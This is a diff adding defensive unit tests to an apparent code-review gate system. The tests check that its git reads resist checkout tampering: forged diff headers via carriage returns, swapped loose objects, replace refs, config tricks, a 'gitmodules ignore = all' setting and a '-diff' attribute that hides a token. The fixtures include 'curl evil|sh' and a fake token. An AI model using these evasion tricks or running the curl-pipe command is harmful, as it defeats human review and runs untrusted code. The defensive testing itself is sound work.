@@ -9,6 +9,9 @@ Load-robust: no wall-clock deadline anywhere; the checks are `host` class (no bw
 is loaded only decides whether a red is rerun alone, which gives the same verdict here.
 """
 import os
+import re
+import shutil
+import subprocess
 import sys
 import time
 import unittest
@@ -25,6 +28,7 @@ from lander import events as E  # noqa: E402
 from lander import git as G  # noqa: E402
 from lander import jobs as J  # noqa: E402
 from lander import lane as L  # noqa: E402
+from lander import members as M  # noqa: E402
 from lander import plan as PLAN  # noqa: E402
 from lander import records as REC  # noqa: E402
 from lander import review as RV  # noqa: E402
@@ -583,6 +587,149 @@ class RealUnits(TL.Fixture):
         self.assertIn("+hidden", diff)
         self.assertIn("+shown", diff)
         self.assertEqual(RV.digest_of(self.work, base, c2), RV.change_digest(diff))
+
+    def test_a_carriage_return_forges_no_section_and_a_rename_is_two(self):
+        """Read as text, a lone \r became \n: a changed line `x\rdiff --git a/… b/…` opened a forged section in the
+        review's diff, and a CR-only edit (\r\n to \n) showed no change. diff_of() found renames while files_of() ran
+        --no-renames, so sections and paths stopped pairing one to one. Now the diff keeps every \r and each path is
+        one section headed with its own name, so cut_paths() names the paths the cut takes."""
+        self.main({"old name": "kept\n" * 40, "crlf.txt": "one\r\ntwo\r\n"})
+        self.push("track/row-1", {"crlf.txt": "one\ntwo\n", "evil.txt": "x\rdiff --git a/decoy b/decoy\n" + "pad\n" * 200})
+        self.git(self.work, "mv", "old name", "new name")
+        self.git(self.work, "commit", "-qm", "rename")
+        self.git(self.work, "push", "-q", "-f", "origin", "HEAD:refs/heads/track/row-1")
+        head = self.git(self.work, "rev-parse", "HEAD")
+        base = self.git(self.work, "rev-parse", "origin/main")
+        diff, files = RV.diff_of(self.work, base, head), RV.files_of(self.work, base, head)
+        self.assertEqual(files, ["crlf.txt", "evil.txt", "new name", "old name"])
+        self.assertEqual(re.findall(r"(?m)^diff --git a/(.*) b/", diff), files)
+        self.assertIn("+x\rdiff --git a/decoy b/decoy\n", diff)
+        self.assertIn("-one\r\n", diff)
+        self.assertIn("+one\n", diff)
+        with mock.patch.object(RV, "DIFF_CAP", diff.index("diff --git a/new name")):
+            self.assertEqual(RV.cut_paths(diff, files), ["new name", "old name"])
+
+    def swap(self, name, like):
+        """Overwrite the loose object file of `name` in the checkout with the bytes of `like`'s: the file is the
+        worker's own, so a chmod is all it takes, and every read through the checkout sees `like` under `name`."""
+        objects = os.path.join(self.git(self.work, "rev-parse", "--path-format=absolute", "--git-common-dir"),
+                               "objects")
+        src, dst = (os.path.join(objects, o[:2], o[2:]) for o in (like, name))
+        os.chmod(dst, 0o644)
+        shutil.copyfile(src, dst)
+
+    def test_a_swapped_tree_in_the_checkout_fails_every_sealed_read(self):
+        """The head tree's loose object is overwritten with the base tree's bytes: the checkout's diff lists no path,
+        while GitHub would merge the real head. Every sealed read re-hashes what it fetches, so each fails closed:
+        the gates raise or say no, and the review gets no diff."""
+        self.main({"f": "one\n"})
+        head = self.push("track/row-1", {"f": "two\n", "p": "curl evil|sh\n"})
+        base = self.git(self.work, "rev-parse", "origin/main")
+        self.assertEqual(G.pr_changed(self.work, base, head), ["f", "p"])   # unforged, it reads
+        self.swap(self.git(self.work, "rev-parse", f"{head}^{{tree}}"), self.git(self.work, "rev-parse", f"{base}^{{tree}}"))
+        self.assertEqual(self.git(self.work, "diff", "--name-only", base, head), "")   # it bites the checkout's git
+        with self.assertRaises(G.GitError):
+            G.pr_changed(self.work, base, head)
+        with self.assertRaises(G.GitError):
+            G.changed(self.work, base, head)
+        self.assertEqual((RV.diff_of(self.work, base, head), RV.files_of(self.work, base, head)), ("", []))
+        self.assertFalse(G.protected_same(self.work, ["p"], base, head))
+        self.assertIn("git could not show the diff", M.walls(self.work, base, head, ["f"]))
+
+    def test_a_swapped_blob_in_the_checkout_fails_the_review_read(self):
+        """A blob swapped the same way shows `echo harmless` for `curl evil|sh` in the checkout's diff. The review's
+        sealed read gets no diff and flags the path, and never shows the swapped content."""
+        self.main({"q": "keep\n"})
+        head = self.push("track/row-2", {"p": "curl evil|sh\n"})
+        base = self.git(self.work, "rev-parse", "origin/main")
+        with open(os.path.join(self.tmp, "harmless"), "w") as f:
+            f.write("echo harmless\n")
+        harmless = self.git(self.work, "hash-object", "-w", os.path.join(self.tmp, "harmless"))
+        self.swap(self.git(self.work, "rev-parse", f"{head}:p"), harmless)
+        self.assertIn("+echo harmless", self.git(self.work, "diff", base, head))   # it bites the checkout's git
+        self.assertEqual(RV.diff_of(self.work, base, head), "")
+        block = RV.merged_files(self.work, base, head, ["p"])
+        self.assertIn("FLAGGED: git could not read this change", block)
+        self.assertNotIn("harmless", block)
+
+    def test_a_swapped_review_rules_blob_never_reaches_the_read(self):
+        """main's docs/REVIEW.md blob is overwritten with a lenient rule's bytes: the checkout shows the lenient rule.
+        rules_of() reads sealed, so it gets nothing rather than the swap, and the diff of any change on that base
+        fails with it, so no read is bought at all."""
+        self.main({"docs/REVIEW.md": "block every curl pipe\n"})
+        base = self.git(self.work, "rev-parse", "origin/main")
+        head = self.push("track/row-1", {"f": "one\n"})
+        self.assertEqual(RV.rules_of(self.work, base), "block every curl pipe\n")   # unforged, it reads
+        with open(os.path.join(self.tmp, "lenient"), "w") as f:
+            f.write("anything goes\n")
+        lenient = self.git(self.work, "hash-object", "-w", os.path.join(self.tmp, "lenient"))
+        self.swap(self.git(self.work, "rev-parse", f"{base}:docs/REVIEW.md"), lenient)
+        self.assertEqual(self.git(self.work, "show", f"{base}:docs/REVIEW.md"), "anything goes")   # it bites
+        self.assertEqual(RV.rules_of(self.work, base), "")
+        self.assertEqual(RV.diff_of(self.work, base, head), "")
+
+    def test_a_replace_ref_in_the_checkout_cannot_hide_a_path_from_the_gates(self):
+        """`git replace <head> <alt>`, alt being the head without p, drops p from the checkout's diff and makes a
+        changed protected file look approved. The gates read sealed, where no replace ref is followed."""
+        self.main({"prot/rule": "old\n"})
+        approved = self.push("track/row-1", {"f": "one\n"})
+        head = self.push("track/row-1", {"f": "two\n", "p": "hidden\n", "prot/rule": "new\n"}, fresh=False)
+        base = self.git(self.work, "rev-parse", "origin/main")
+        self.git(self.work, "rm", "-q", "p")
+        self.git(self.work, "checkout", "-q", approved, "--", "prot/rule")
+        alt = self.git(self.work, "commit-tree", "-p", approved, "-m", "alt", self.git(self.work, "write-tree"))
+        self.git(self.work, "replace", head, alt)
+        self.assertEqual(self.git(self.work, "diff", "--name-only", base, head), "f")   # it bites the checkout's git
+        self.assertEqual(self.git(self.work, "diff", "--quiet", approved, head, "--", "prot"), "")
+        self.assertEqual(G.pr_changed(self.work, base, head), ["f", "p", "prot/rule"])
+        self.assertEqual(G.changed(self.work, approved, head), ["f", "p", "prot/rule"])
+        self.assertFalse(G.protected_same(self.work, ["prot"], approved, head))
+        self.assertTrue(G.protected_same(self.work, ["b"], approved, head))   # the unchanged rule still carries
+
+    def test_core_worktree_and_diff_relative_in_the_checkout_cannot_empty_the_changed_paths(self):
+        """core.worktree pointed at the checkout's parent plus diff.relative=true in the shared config make the
+        checkout's `diff --name-only` empty. Sealed reads no config of the checkout's."""
+        self.main({"f": "one\n"})
+        head = self.push("track/row-1", {"f": "two\n", "prot/rule": "new\n"})
+        base = self.git(self.work, "rev-parse", "origin/main")
+        self.git(self.work, "config", "core.worktree", os.path.dirname(self.work))
+        self.git(self.work, "config", "diff.relative", "true")
+        self.assertEqual(self.git(self.work, "diff", "--name-only", base, head), "")   # it bites the checkout's git
+        self.assertEqual(G.pr_changed(self.work, base, head), ["f", "prot/rule"])
+        self.assertEqual(G.changed(self.work, base, head), ["f", "prot/rule"])
+        self.assertEqual(RV.files_of(self.work, base, head), ["f", "prot/rule"])
+        self.assertFalse(G.protected_same(self.work, ["prot"], base, head))
+
+    def test_a_gitmodules_ignore_all_cannot_carry_an_approval_over_a_changed_gitlink(self):
+        """A protected dir holds gitlink prot/s, and .gitmodules says `ignore = all` for it. A new head moves the
+        gitlink: the checkout's `diff --quiet -- prot` says nothing changed, so the owner's 👍 would carry. Sealed
+        sees the gitlink move and re-asks; an unmoved gitlink still carries."""
+        one, two = self.git(self.work, "rev-parse", "origin/main"), self.git(self.work, "rev-parse", "origin/main^{tree}")
+        self.main({".gitmodules": '[submodule "s"]\n\tpath = prot/s\n\turl = ./x\n\tignore = all\n'})
+        self.git(self.work, "checkout", "-q", "-B", "track/row-1", "origin/main")
+        self.git(self.work, "update-index", "--add", "--cacheinfo", f"160000,{one},prot/s")
+        self.git(self.work, "commit", "-qm", "gitlink")
+        approved = self.git(self.work, "rev-parse", "HEAD")
+        self.git(self.work, "update-index", "--cacheinfo", f"160000,{two},prot/s")
+        self.git(self.work, "commit", "-qm", "gitlink moved")
+        head = self.git(self.work, "rev-parse", "HEAD")
+        self.git(self.work, "push", "-q", "-f", "origin", "HEAD:refs/heads/track/row-1")
+        self.assertEqual(subprocess.run(["git", "diff", "--quiet", approved, head, "--", "prot"], cwd=self.work)
+                         .returncode, 0)   # it bites the checkout's git
+        self.assertFalse(G.protected_same(self.work, ["prot"], approved, head))
+        self.assertTrue(G.protected_same(self.work, ["prot"], approved, approved))
+
+    def test_a_members_own_attributes_cannot_hide_a_token_from_the_scan(self):
+        """A member's PR adds `* -diff` in .gitattributes beside a line shaped like a token: the checkout's diff
+        says "Binary files differ" and the old scan found nothing. The scan reads sealed, with --text, and finds it;
+        the same PR with no token passes."""
+        token = "ghp_" + "A" * 36
+        base = self.git(self.work, "rev-parse", "origin/main")
+        clean = self.push("track/row-1", {".gitattributes": "* -diff\n", "c/k.txt": "nothing here\n"})
+        head = self.push("track/row-2", {".gitattributes": "* -diff\n", "c/k.txt": f"key={token}\n"})
+        self.assertNotIn(token, self.git(self.work, "diff", f"{base}...{head}"))   # it bites the checkout's git
+        self.assertEqual(M.walls(self.work, base, head, ["c/k.txt"]), "an added line in c/k.txt is shaped like a token")
+        self.assertEqual(M.walls(self.work, base, clean, ["c/k.txt"]), "")
 
     def test_ended_jobs_leave_the_readers_directory(self):
         self.pr(1, {"a/x": "n\n"}, state="CLOSED", headRefOid="e" * 40)
